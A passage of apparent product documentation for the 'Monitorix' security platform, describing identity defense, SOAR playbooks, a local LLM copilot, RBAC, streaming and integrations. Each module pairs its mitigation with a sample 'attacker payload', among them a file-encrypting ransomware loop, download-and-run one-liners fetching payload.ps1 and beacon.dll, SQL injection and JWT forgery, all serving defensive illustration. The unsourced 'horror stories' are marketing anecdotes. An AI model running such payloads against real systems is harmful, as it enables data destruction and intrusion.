│           Impossible Travel & Velocity Engine          │
│   Calculates geodesic distance / elapsed login time    │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│           Active Directory & Kerberos Defense          │
│   Detects Golden Ticket, Kerberoasting, DCSync attacks │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│           Device Posture & Trust Engine (mTLS)         │
│   Validates TPM 2.0 chip, Secure Boot, Disk Encryption │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│       Autonomous Session Invalidation & Step-Up        │
│   Invalidates JWT tokens, requires FIDO2/WebAuthn MFA  │
└───────────────────────────┘
```
#### 7-Step Technical Lifecycle
01. **Identity Authentication Ingress**: Receives real-time authentication events via SCIM 2.0, SAML, and OAuth2/OIDC from identity providers (Azure AD, Okta, Active Directory).
02. **Geo-Velocity & Impossible Travel Calculation**: Compares latitude/longitude of consecutive login events against time elapsed. Any speed exceeding commercial jet travel (> 900 km/h) triggers an alert.
03. **Active Directory Event Correlation**: Monitors Domain Controller Windows Event Logs (Event IDs 4624, 4672, 4768, 4769) for Golden Ticket and Kerberoasting anomalies.
04. **Privileged Group Membership Drift**: Audits changes to sensitive Active Directory groups (Domain Admins, Enterprise Admins) in real time; unauthorized additions trigger immediate revocation.
05. **Endpoint Device Posture Verification**: Before granting access to corporate applications, checks that the connecting laptop has Secure Boot enabled, BitLocker active, and Monitorix agent running.
06. **Dynamic Risk Score Recalculation**: Combines identity risk, device trust score, and network risk into an instantaneous session trust index (0.0 to 1.0).
07. **Autonomous Session Revocation**: If the trust index drops below threshold (e.g. 0.70), Monitorix revokes the user's active OAuth tokens, terminates sessions, and demands FIDO2 biometric MFA.

#### Subsystems, Schemas & API Endpoints
* Impossible Travel Engine: Haversine distance calculator auditing login coordinates and flagging anomalous IP velocities.
* AD Defense Core: Real-time detection for DCSync, Golden Ticket, Pass-the-Hash, and AS-REP roasting.
* Device Trust Sentinel: Evaluates hardware TPM state, OS patch level, and local firewall posture.
* Continuous Access Evaluator: In-memory token revocation engine publishing session blacklists to API gateways.
* **Database Tables**: `users, user_sessions, device_trust, ad_audit_events, identity_risk_scores`
* **Key API Routes**: `/identity, /identity/impossible-travel, /identity/ad-defense, /identity/device-trust, /identity/users`

### 06. SECURITY OPERATIONS (SOAR Playbooks, MDR & Shift Triage)
**Description**: Autonomous Security Orchestration, Automation, and Response (SOAR). Provides visual DAG playbook builder, 24/7 Managed Detection & Response (MDR) shift handover protocol, and automated compliance auditing.

**Architectural Blueprint**: [`command_center_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/command_center_architecture.jpg)

> **Plain-English Analogy (ELI5)**: Think of an ultra-modern hospital emergency room. When a critical patient arrives, doctors and nurses don't stop to read a medical encyclopedia; they immediately follow an exact, practiced resuscitation playbook step-by-step. This module gives your security team automated, visual playbooks (SOAR) that automatically execute containment actions in milliseconds and manages 24/7 analyst shift handovers.

> **Real-World Business Horror Story**: A company suffered a ransomware infection at 2:00 AM on Sunday. The lone night analyst didn't know who to call or which firewall rules to edit. By the time the senior team arrived on Monday at 9:00 AM, 400 servers were encrypted. The lack of automated playbooks turned a 5-minute incident into a company-ending disaster.

> **Step-by-Step Attack Walkthrough**: A ransomware strain begins encrypting files on an accounting workstation. In 180 milliseconds, the Monitorix 'Ransomware Containment' SOAR Playbook triggers automatically: Step 1: Kill the process. Step 2: Sever network cables digitally. Step 3: Revoke user credentials. Step 4: Page the on-call analyst. All 4 steps finish before the human analyst can even unlock their phone.

#### Technical Evidence: Exploit vs. Event vs. Mitigation
```bash
# 1. Attacker Exploit Payload
# Attacker fires rapid ransomware encryption loop
Get-ChildItem -Path C:\Shares\Accounting -Recurse | ForEach-Object {
  $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
  $enc = [AESEncryptor]::Encrypt($bytes, $ransomKey)
  [System.IO.File]::WriteAllBytes($_.FullName + ".locked", $enc)
  Remove-Item $_.FullName
}
```
```json
// 2. Raw Agent Event (JSON)
{
  "event_id": "soar-rw-0091",
  "tenant_id": "00000000-0000-0000-0000-000000000001",
  "trigger_rule": "RANSOMWARE_ENCRYPTION_BURST",
  "host_id": "ag-win-acct-01",
  "process": "powershell.exe",
  "files_renamed_per_sec": 482,
  "playbook_invoked": "PLAYBOOK_P1_RANSOMWARE_CONTAINMENT",
  "status": "CONTAINMENT_SUCCESS"
}
```
```json
// 3. Autonomous Mitigation (SOAR / Kernel Action)
# Automated SOAR Playbook Execution Payload
POST /api/v2/soc/playbooks/execute
{
  "playbook_id": "pb-p1-ransomware-quarantine",
  "target_host": "ag-win-acct-01",
  "actions": [
    {"type": "PROCESS_KILL", "target": "powershell.exe"},
    {"type": "ISOLATE_NETWORK", "allow_gateway_only": true},
    {"type": "RESTORE_CANARY_SHADOW_COPIES", "status": "READY"}
  ],
  "execution_time_ms": 240
}
```
#### Architectural Flowchart
```
┌────────────────────────────────────────────────────────┐
│             Alert Ingestion & Severity Trigger         │
│     (P1 Critical: Ransomware, Domain Takeover, Leak)   │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│          Visual DAG Playbook Execution Engine          │
│   (Directed Acyclic Graph: Conditional Logic & Action) │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│           Autonomous Containment Orchestration         │
│   - Network Isolation (iptables / Windows Minifilter)  │
│   - Process SIGKILL & Memory Freeze                    │
│   - Firewall Edge Block (Cloudflare / Palo Alto API)   │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│          MDR Shift Triage & On-Call Paging             │
│   Slack / PagerDuty / Microsoft Teams Multi-Channel    │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│       Automated Regulatory Compliance Generation       │
│   ISO 27001, SOC 2 Type II, NIST CSF, PCI-DSS Reports  │
└────────────────────────────────────────────────────────┘
```
#### 7-Step Technical Lifecycle
01. **Alert Ingress & Rule Evaluation**: Incoming security alerts are evaluated against active SOAR playbook triggers using sub-millisecond pattern matching.
02. **Playbook Graph Execution**: Executes the compiled Directed Acyclic Graph (DAG), resolving conditional branches (e.g. 'If host is production DB, request human approval; else auto-isolate').
03. **Autonomous Action Dispatch**: Calls agent and infrastructure APIs to execute containment: killing processes, disabling user accounts, and injecting edge firewall rules.
04. **Enrichment & Threat Intel Query**: Queries internal threat databases to enrich incident context with IP geolocation, ASN information, and historical adversary campaigns.
05. **Multi-Channel Emergency Notification**: Pushes real-time alerts to Slack, Microsoft Teams, and PagerDuty with interactive approval buttons ('Confirm Quarantine', 'Dismiss').
06. **Shift Handover Protocol Recording**: Documents all ongoing investigations, assigned analysts, and open tasks into the shift logbook for seamless 24/7 operator handover.
07. **Compliance Evidence Synthesis**: Automatically attaches incident timeline and remediation logs to compliance frameworks (ISO 27001 Annex A, SOC 2 CC7.3).

#### Subsystems, Schemas & API Endpoints
* DAG Playbook Engine: Visual drag-and-drop workflow builder supporting loops, conditional branches, and manual checkpoints.
* MDR Handover Portal: Structured shift logbook tracking active incidents, SLA countdowns, and Tier 3 escalations.
* Autonomous Response Dispatcher: High-speed command bus issuing remediation actions across thousands of nodes in parallel.
* Compliance Engine: Continuous mapping to SOC 2, ISO 27001, HIPAA, and PCI-DSS requirements.
* **Database Tables**: `soar_playbooks, playbook_executions, shift_logs, compliance_frameworks, audit_logs`
* **Key API Routes**: `/soc/playbooks, /soc/queue, /soc/shift-handover, /compliance/reports, /soc/integrations`

### 07. INTELLIGENCE & ANALYTICS (Air-Gapped LLM & FAIR Risk)
**Description**: Autonomous enterprise security intelligence engine powered by local air-gapped Large Language Models (LLM) and the FAIR (Factor Analysis of Information Risk) quantitative model. Never transmits telemetry outside the sovereign perimeter.

**Architectural Blueprint**: [`ai_autonomous_security_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/ai_autonomous_security_architecture.jpg)

> **Plain-English Analogy (ELI5)**: Think of a super-smart in-house cybersecurity genius who has memorized every hacking manual ever written, speaks fluent English, and works 24/7 without taking a coffee break. Because this genius runs 100% inside your own servers (air-gapped), your private company data is never sent to OpenAI or any public cloud. You can ask this genius questions like 'Explain this attack in plain English' and get instant answers.

> **Real-World Business Horror Story**: A company used a public cloud AI to analyze a confidential source code leak. Two months later, researchers discovered that the public AI model was quoting the company's proprietary trade secrets and passwords back to random internet users because the company failed to use an on-premises, private AI model.

> **Step-by-Step Attack Walkthrough**: A sophisticated multi-stage attack hits 4 servers over 3 days. A human analyst would take 40 hours to read through 500,000 log lines to find the connection. Monitorix AI Copilot analyzes the entire stream in 4 seconds, writes a 3-paragraph summary in plain English, and draws an interactive diagram showing exactly how the hacker entered.

#### Technical Evidence: Exploit vs. Event vs. Mitigation
```bash
# 1. Attacker Exploit Payload
# Attacker executes multi-stage living-off-the-land (LotL) attack
wmic process call create "powershell -nop -c iex(New-Object Net.WebClient).DownloadString('http://10.0.0.99/payload.ps1')"
bitsadmin /transfer myDownloadJob /download /priority normal http://10.0.0.99/beacon.dll C:\Users\Public\beacon.dll
```
```json
// 2. Raw Agent Event (JSON)
{
  "event_id": "ai-copilot-8812",
  "tenant_id": "00000000-0000-0000-0000-000000000001",
  "query": "Explain incident INC-9941 to executive leadership",
  "model_used": "meta-llama/Llama-3-70B-Instruct-AirGapped",
  "inference_latency_ms": 320,
  "sovereignty_status": "100%_AIR_GAPPED_NO_EXTERNAL_LEAKAGE"
}
```
```json
// 3. Autonomous Mitigation (SOAR / Kernel Action)
# AI Copilot Executive Synthesis Query
POST /api/v2/copilot/explain
{
  "incident_id": "INC-9941",
  "audience": "CISO_AND_BOARD",
  "include_financial_fair_model": true,
  "financial_loss_prevented_usd": 1850000.00
}
```
#### Architectural Flowchart
```
┌────────────────────────────────────────────────────────┐
│           Raw Security Telemetry & Log Ingestion       │
│      (ClickHouse Events, Syslogs, Network Packets)     │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│        Local Air-Gapped LLM Inference Engine           │
│   (Ollama / Llama-3-70B running on local GPU cluster)  │
│   100% Sovereign: Zero External Cloud API Dependency   │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│           AI Security Copilot Dialogue Layer           │
│   - Natural Language Incident Explanation              │
│   - Automated Root-Cause Synthesis                     │
│   - 1-Click Executive Summary Generation               │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         FAIR Quantitative Risk Modeling Core           │
│   Loss Event Frequency (LEF) x Loss Magnitude (LM)     │
│   Calculates Expected Dollar Loss ($) per Threat       │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         CISO Executive Financial Risk Dashboard        │
│    Projected Annual Loss Expectancy (ALE) in USD ($)   │
└────────────────────────────────────────────────────────┘
```
#### 7-Step Technical Lifecycle
01. **Context Ingestion & Sanitization**: Aggregates incident logs, process trees, and network flows, stripping sensitive PII before passing to the local inference buffer.
02. **Local Air-Gapped Model Execution**: Sends prompt to locally hosted LLM running on enterprise GPU hardware; zero bytes ever exit the organization's firewall.
03. **Natural Language Incident Narrative**: AI model generates a comprehensive 3-paragraph incident briefing: Executive Summary, Technical Root Cause, and Recommended Containment.
04. **Automated Remediation Script Synthesis**: AI drafts custom mitigation scripts (e.g. customized PowerShell cleanup or YARA signature) tailored to the specific zero-day attack.
05. **FAIR Financial Exposure Calculation**: Calculates Loss Event Frequency (LEF) and Vulnerability (V) to project Expected Loss Magnitude (LM) in real currency (e.g. $1.4M potential impact).
06. **ROI & Insurance Defense Reporting**: Generates quantitative cyber insurance and Board of Directors briefings demonstrating financial loss prevented by Monitorix.
07. **Continuous Model Fine-Tuning**: Incorporates analyst triage feedback into local LoRA weights, continuously improving detection accuracy without data leakage.

#### Subsystems, Schemas & API Endpoints
* Local LLM Inference Engine: Private air-gapped neural network delivering zero-data-loss security intelligence.
* AI Security Copilot: Conversational assistant answering technical queries, writing YARA rules, and explaining complex logs.
* FAIR Risk Calculator: Mathematical framework quantifying cyber risk into dollars and cents for board presentations.
* Boardroom Report Generator: 1-click export of executive-level PDF briefs with ROI metrics and threat reduction statistics.
* **Database Tables**: `ai_conversations, copilot_prompts, fair_risk_models, executive_reports, model_checkpoints`
* **Key API Routes**: `/copilot, /analytics/fair-risk, /analytics/models, /analytics/reports, /copilot/chat`

### 08. ADMINISTRATION (5-Tier RBAC, RLS & Licensing)
**Description**: Enterprise administrative governance, multi-tenant data isolation, 5-tier Role-Based Access Control (RBAC), and RSA-4096 licensing validation.

**Architectural Blueprint**: [`multi_organization_tenancy_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/multi_organization_tenancy_architecture.jpg)

> **Plain-English Analogy (ELI5)**: Think of a luxury high-rise condominium building with a master digital keycard system. The penthouse owner can enter their own floor and private elevator, but cannot open their neighbor's door. The building maintenance manager can access electrical rooms, but not private bedrooms. This module enforces 5 strict security levels (RBAC), guarantees that different tenant organizations can never peek into each other's data (PostgreSQL Row-Level Security), and manages cryptographically signed enterprise licenses.

> **Real-World Business Horror Story**: A multi-tenant cloud provider had a database bug. An intern at Company A searched for 'invoices' and accidentally viewed the confidential financial statements of Company B. The leak resulted in immediate contract cancellations and a $45 million class-action lawsuit.

> **Step-by-Step Attack Walkthrough**: A compromised user account with 'Viewer' privileges attempts to tamper with the company's security policies by sending a malicious API request. Monitorix 5-Tier RBAC immediately checks the cryptographic token, detects that the user lacks the 'Security_Admin' scope, rejects the request with HTTP 403 Forbidden, and alerts the security director.

#### Technical Evidence: Exploit vs. Event vs. Mitigation
```bash
# 1. Attacker Exploit Payload
# Attacker attempts cross-tenant SQL injection to steal other tenant data
GET /api/v1/incidents?tenant_id=00000000-0000-0000-0000-000000000002' OR 1=1--
# Attacker attempts privilege escalation by forging JWT token
python3 jwt_forger.py --token $STOLEN_JWT --set-role SuperAdmin --sign-none
```
```json
// 2. Raw Agent Event (JSON)
{
  "event_id": "admin-rbac-7714",
  "tenant_id": "00000000-0000-0000-0000-000000000001",
  "user_id": "usr-analyst-bob",
  "action": "MODIFY_SECURITY_POLICY",
  "target_policy": "CANARY_TRIPWIRE_RULES",
  "result": "ACCESS_DENIED_HTTP_403",
  "reason": "INSUFFICIENT_PRIVILEGES_REQUIRES_SECADMIN",
  "timestamp": "2026-10-28T08:14:15.891Z"
}
```
```json
// 3. Autonomous Mitigation (SOAR / Kernel Action)
# Automated RBAC Rejection & Session Lock
HTTP/1.1 403 Forbidden
Content-Type: application/json
{
  "error": "AccessDenied",
  "message": "User 'usr-analyst-bob' lacks SecAdmin permission for policy mutations.",
  "audit_id": "audit-entry-88910-rls",
  "action": "LOGGED_TO_IMMUTABLE_ADMIN_LEDGER"
}
```
#### Architectural Flowchart
```
┌────────────────────────────────────────────────────────┐
│           User Authentication & Token Ingress          │
│       JWT / OAuth2 Bearer Token + mTLS Certificate     │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│          5-Tier RBAC Permission Evaluation             │
│   SuperAdmin > SecAdmin > Analyst > Auditor > Viewer   │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│        PostgreSQL Row-Level Security (RLS) Engine      │
│   SET LOCAL app.current_tenant_id = 'org-uuid-123'     │
│   Enforces mathematical tenant isolation at DB layer   │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         RSA-4096 Cryptographic License Validator      │
│   Node count quota, expiration date & feature flags    │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         Immutable Audit Log & Action Record            │
│   Append-only database ledger with SHA-256 integrity   │
└───────────────────────────┘
```
#### 7-Step Technical Lifecycle
01. **Identity & Scope Extraction**: Ingress gateway extracts user UUID, tenant ID, and RBAC roles from the validated JWT token signature.
02. **5-Tier Role Hierarchy Enforcement**: Evaluates requested operation against hierarchical role matrix: SuperAdmin (all), SecAdmin (policies), Analyst (triage), Auditor (read-only logs), Viewer (dashboards).
03. **PostgreSQL Session Variable Injection**: Before executing any SQL query, injects 'SET LOCAL app.current_tenant_id' into the connection session.
04. **Row-Level Security (RLS) Filter Execution**: PostgreSQL kernel automatically appends 'WHERE tenant_id = current_tenant_id' to all SELECT, UPDATE, and DELETE queries, guaranteeing isolation.
05. **RSA-4096 License Signature Verification**: Validates enterprise license file using public key cryptography; checks agent count quotas, expiration dates, and licensed modules.
06. **License Quota Enforcement**: If agent count exceeds license quota (e.g. 5,000 / 5,000), gracefully rejects new agent enrollments while preserving existing monitoring.
07. **Administrative Audit Trail Recording**: Every administrative action (user created, role modified, policy saved) is permanently logged to an append-only audit ledger.

#### Subsystems, Schemas & API Endpoints
* 5-Tier RBAC Engine: Fine-grained access control with inheritance and custom organizational role overrides.
* PostgreSQL RLS Core: Database-level mathematical isolation preventing cross-tenant data leaks.
* RSA-4096 License Manager: Cryptographic licensing validation verifying node allowances and feature tiers.
* Immutable Administrative Ledger: Cryptographically chained audit logging meeting SOC 2 CC6 requirements.
* **Database Tables**: `users, roles, permissions, tenants, licenses, admin_audit_logs`
* **Key API Routes**: `/admin/users, /admin/roles, /admin/tenants, /admin/licensing, /admin/audit-logs`

### 09. PLATFORM (Kernel Probes, Kafka Lag & Health)
**Description**: High-performance platform engineering backbone. Integrates low-overhead OS kernel probes, Apache Kafka event streaming with manual offset commits, and comprehensive system health monitoring.

**Architectural Blueprint**: [`platform_master_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/platform_master_architecture.jpg)

> **Plain-English Analogy (ELI5)**: Think of the structural foundation, steel beams, electrical grid, and plumbing of a 100-story skyscraper. Without rock-solid engineering underneath, the entire building would collapse in a storm. The Platform module is the deep engine room of Monitorix: high-speed kernel probes, Apache Kafka message pipes that process millions of events per second with zero lag, and automated health checks.

> **Real-World Business Horror Story**: A company deployed a cheap security tool that used 100% of the server CPU during a busy holiday shopping weekend. The company's e-commerce servers crashed, locking out 500,000 customers and causing $8 million in lost sales. Monitorix was specifically designed with strict kernel limits to prevent this.

> **Step-by-Step Attack Walkthrough**: A hacker unleashes a Distributed Denial of Service (DDoS) attack, sending 50,000 malicious network requests every second to crash the security platform. Monitorix Kafka message buffers automatically absorb the flood, partition the traffic, and discard the junk data while keeping CPU usage below 2%.

#### Technical Evidence: Exploit vs. Event vs. Mitigation
```bash
# 1. Attacker Exploit Payload
# Attacker attempts to flood agent with 100,000 fake process events to cause kernel panic
for i in {1..100000}; do
  /bin/true &
done
```
```json
// 2. Raw Agent Event (JSON)
{
  "event_id": "plat-kernel-1102",
  "tenant_id": "00000000-0000-0000-0000-000000000001",
  "component": "KAFKA_STREAMING_FABRIC",
  "topic": "monitorix.telemetry.raw",
  "partition": 3,
  "consumer_lag_ms": 1.2,
  "events_processed_per_sec": 14200,
  "data_loss_rate": "0.00%",
  "system_cpu_overhead": "0.85%"
}
```
```json
// 3. Autonomous Mitigation (SOAR / Kernel Action)
# Autonomous Kernel Event Throttling
[KERNEL_DRIVER]: Priority-Tiered Spool Retention Active
Preserving Tier 0 Security Alerts: 100.0%
Dropping Background Telemetry Ping: 40 events
System Stability: 100.0% NOMINAL
```
#### Architectural Flowchart
```
┌────────────────────────────────────────────────────────┐
│          OS Kernel Probes & Event Emitters             │
│   Windows (monitorix.sys) | Linux (eBPF) | macOS (ESF) │
│       CPU Overhead < 1.0% | Memory Footprint < 45 MB   │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│        High-Throughput Apache Kafka Event Fabric       │
│   - Topic: monitorix.telemetry.raw (12 Partitions)     │
│   - Manual Offset Commits (Zero Data Loss Guarantee)   │
│   - Dead Letter Queue (DLQ) Auto-Routing               │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         High-Speed Ingestion & Stream Processing       │
│   Celery Workers + AsyncIO Coroutines (< 250 µs/event) │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│          Analytical & Operational Persistence          │
│   PostgreSQL (State & Relational) | ClickHouse (Logs)  │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         Unified Data-Loss Observability Monitor        │
│   Exposes /api/v1/health/data-loss-observability       │
│   Reports 0.0% Critical Loss & Lag Status in Real Time │
└────────────────────────────────────────────────────────┘
```
#### 7-Step Technical Lifecycle
01. **Kernel Probe Event Interception**: Kernel filter drivers and eBPF probes intercept low-level syscalls (process spawn, socket open, file write) with < 1.0% CPU overhead.
02. **In-Memory Ring Buffer & Throttling**: Events are buffered inside an in-memory ring buffer; if disk or network is congested, low-priority events are gracefully sampled while Tier 0 security alerts are 100% preserved.
03. **mTLS 1.3 Transport Streaming**: Micro-batches are serialized into binary format and pushed to Ingestion Gateways over persistent HTTP/2 and gRPC streams.
04. **Kafka Partitioning & Offset Management**: Kafka brokers distribute events across 12 partitions by TenantId. Consumers use manual offset commits after successful database persistence.
05. **Dead Letter Queue (DLQ) Diverter**: Any unparseable payload or malformed schema is pushed to topic 'monitorix.dlq' for automated offline inspection without stalling the main pipeline.
06. **Analytical Persistence to ClickHouse**: High-velocity telemetry streams are written in batches of 10,000 rows into ClickHouse MergeTree tables, enabling sub-second SQL queries over billions of rows.
07. **Platform Health Observability Endpoint**: Exposes health endpoint (/api/v1/health) reporting component statuses, consumer group lag, memory usage, and 0.0% data loss rate.

#### Subsystems, Schemas & API Endpoints
* Kernel Telemetry Collector: Ultra-lightweight system driver for Windows, Linux, and macOS.
* Kafka Streaming Cluster: Distributed message broker guaranteeing at-least-once delivery with zero message loss.
* Dead Letter Queue (DLQ): Automated forensic holding bay for malformed or unparseable packets.
* Data-Loss Observability: Real-time telemetry monitoring consumer group offsets and ingestion health.
* **Database Tables**: `platform_health, kafka_offsets, dlq_records, agent_telemetry, system_metrics`
* **Key API Routes**: `/platform/health, /platform/kafka-lag, /platform/kernel-status, /data-loss-monitoring, /platform/nodes`

### 10. SAAS & GLOBAL ENTERPRISE (GeoDNS, Data Sovereignty & Mesh)
**Description**: Global multi-region SaaS architecture. Provides GeoDNS routing, sovereign data residency enforcement (GDPR, HIPAA, DPDP Act), and multi-region database mesh synchronization.

**Architectural Blueprint**: [`multi_organization_tenancy_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/multi_organization_tenancy_architecture.jpg)

> **Plain-English Analogy (ELI5)**: Think of a worldwide diplomatic embassy network. Every country has strict laws saying: 'German citizen data must physically remain inside Germany, and Indian medical records must physically remain inside India.' This module uses smart geographic routing (GeoDNS) and multi-region database replication to guarantee that enterprise data never illegally crosses international borders, keeping you fully compliant with global data privacy laws.

> **Real-World Business Horror Story**: A healthcare enterprise backed up European patient records to an American cloud data center. The European Union privacy regulator discovered the illegal transfer and levied a €14 million GDPR cross-border transfer penalty. Monitorix eliminates this risk with automated data residency boundaries.

> **Step-by-Step Attack Walkthrough**: A nation-state adversary cuts an undersea fiber-optic cable in the Atlantic Ocean, severing communication between Europe and America. Because Monitorix runs a decentralized multi-region mesh, the European security nodes continue operating independently without missing a single beat or dropping an alert.

#### Technical Evidence: Exploit vs. Event vs. Mitigation
```bash
# 1. Attacker Exploit Payload
# Attacker attempts cross-border data exfiltration via rogue API query
GET /api/v2/saas/tenants/eu-finance-org/export?destination=us-public-s3
# Intercepted by Data Residency Policy Engine
```
```json
// 2. Raw Agent Event (JSON)
{
  "event_id": "saas-geo-5510",
  "tenant_id": "org-eu-banking-009",
  "jurisdiction": "EU_GDPR_STRICT",
  "request_origin": "Frankfurt, Germany",
  "data_residency_status": "COMPLIANT_STORED_IN_FRANKFURT",
  "cross_border_leakage_detected": false,
  "sync_latency_ms": 22
}
```
```json
// 3. Autonomous Mitigation (SOAR / Kernel Action)
# Autonomous Data Sovereignty Boundary Enforcement
HTTP/1.1 403 Forbidden
{
  "error": "DataResidencyViolation",
  "policy": "EU-GDPR-ART-44",
  "message": "Cross-border transfer to non-EU destination rejected by Sovereign Guard."
}
```
#### Architectural Flowchart
```
┌────────────────────────────────────────────────────────┐
│           Global Client / Agent Traffic Ingress        │
│    (London, Frankfurt, Mumbai, Singapore, New York)    │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         GeoDNS Smart Routing & Latency Optimizer       │
│   Routes agent to nearest regional edge (< 35 ms)      │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         Sovereign Data Residency Boundary Guard        │
│   Enforces EU GDPR, US HIPAA & India DPDP Act Rules    │
│   Guarantees telemetry never crosses national borders  │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         Multi-Region Database Mesh & Sync Core         │
│   Decentralized PostgreSQL & ClickHouse Replicas       │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│       Global Quota Metering & Enterprise Billing       │
│   Tracks agent counts, retention days, and API limits  │
└────────────────────────────────────────────────────────┘
```
#### 7-Step Technical Lifecycle
01. **GeoDNS Resolution & Latency Optimization**: Any agent connecting to the platform is resolved via GeoDNS to the physically closest regional data center, cutting latency to < 35 ms.
02. **Sovereign Region Assignment**: Each tenant organization is tagged with a sovereign regulatory jurisdiction (e.g. EU-Central, US-East, AP-South).
03. **Data Residency Perimeter Enforcement**: API gateways ensure that telemetry, logs, and database records generated by EU agents are stored exclusively on EU physical servers.
04. **Cross-Region Mesh Synchronization**: Non-PII global threat indicators (e.g. malicious IP addresses, file hashes) are federated across all regions using encrypted mesh replication.
05. **Automated Disaster Recovery Failover**: If a data center experiences a total power outage, traffic seamlessly fails over to the regional standby node with RTO < 5 seconds.
06. **Global Enterprise Quota Metering**: Real-time metering service audits API requests, retention storage, and active agent counts against enterprise subscription tiers.
07. **Unified Sovereign Management Console**: Global CISOs can inspect compliance postures across 50 countries from a single pane of glass without violating data privacy laws.

#### Subsystems, Schemas & API Endpoints
* GeoDNS Anycast Router: Directs client and agent connections to the nearest low-latency ingress node.
* Sovereign Residency Gatekeeper: Ensures strict compliance with European GDPR, US HIPAA, and Indian DPDP Acts.
* Multi-Region Mesh Replicator: Synchronizes threat intelligence globally while isolating customer private data.
* Enterprise Quota Engine: Real-time telemetry measuring tenant usage, storage volume, and API bandwidth.
* **Database Tables**: `saas_tenants, regions, data_residency_policies, tenant_quotas, billing_metrics`
* **Key API Routes**: `/saas/tenants, /saas/regions, /saas/residency, /saas/quotas, /saas/billing`

### 11. ECOSYSTEM & MARKETPLACE (Connectors, Webhooks & APIs)
**Description**: Open integration marketplace and API gateway. Connects Monitorix with existing enterprise security infrastructure (SIEMs, ticketing, chatops) using HMAC-authenticated webhooks and bi-directional REST APIs.

**Architectural Blueprint**: [`multilevel_system_architecture.jpg`](file:///opt/projects/monitorix/docs/architecture_assets/multilevel_system_architecture.jpg)

> **Plain-English Analogy (ELI5)**: Think of the universal electrical wall plugs and USB-C ports on your computer. You can plug in chargers, headphones, external monitors, or hard drives from any brand in the world, and they all just work. The Ecosystem module provides ready-made software adapters so Monitorix can easily plug into your existing IT tools: Splunk, Microsoft Sentinel, Slack, Jira, ServiceNow, and custom webhooks.

> **Real-World Business Horror Story**: A company invested $500,000 in a new security tool that couldn't connect to their existing Jira ticketing system. For 6 months, IT engineers had to manually copy-and-paste alerts between screens. Because of human fatigue, a critical database alert was missed, leading to a massive data leak.

> **Step-by-Step Attack Walkthrough**: A critical database attack occurs at 3:00 AM. Monitorix automatically creates a High-Priority Jira ticket, sends a formatted alert with action buttons into the #soc-emergencies Slack channel, and triggers a ServiceNow incident workflow. The security team resolves the incident in 8 minutes directly from their mobile phones.

#### Technical Evidence: Exploit vs. Event vs. Mitigation
```bash
# 1. Attacker Exploit Payload
# Attacker attempts webhook replay attack by capturing outbound payload
curl -X POST https://api.enterprise.com/webhooks/monitorix \
  -H "X-Monitorix-Signature: fake_signature_hash" \
  -d '{"event":"DISMISS_ALL_INCIDENTS"}'
```
```json
// 2. Raw Agent Event (JSON)
{
  "event_id": "eco-hook-9012",
  "tenant_id": "00000000-0000-0000-0000-000000000001",
  "connector_type": "SLACK_CHATOPS",
  "channel": "#soc-incidents",
  "status": "DELIVERED",
  "hmac_verified": true,
  "response_latency_ms": 115
}
```
```json
// 3. Autonomous Mitigation (SOAR / Kernel Action)
# Webhook Gateway Replay Rejection
HTTP/1.1 401 Unauthorized
{
  "error": "InvalidSignature",
  "message": "HMAC-SHA256 verification failed. Timestamp drift > 300s. Webhook rejected."
}
```
#### Architectural Flowchart
```
┌────────────────────────────────────────────────────────┐
│           Monitorix Alert & Incident Dispatcher        │
│       (High-Severity Alerts, Policy Drift, IOCs)       │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│         HMAC-SHA256 Webhook Signing Gateway            │
│   Signs all outbound webhook payloads with secret keys │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│           Enterprise SIEM Connectors (Streaming)       │
│   Splunk HEC | Microsoft Sentinel | Elastic Security   │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
│           ITSM & Incident Management Connectors        │
│   Atlassian Jira | ServiceNow ITSM | PagerDuty         │
└───────────────────────────┬────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────┐
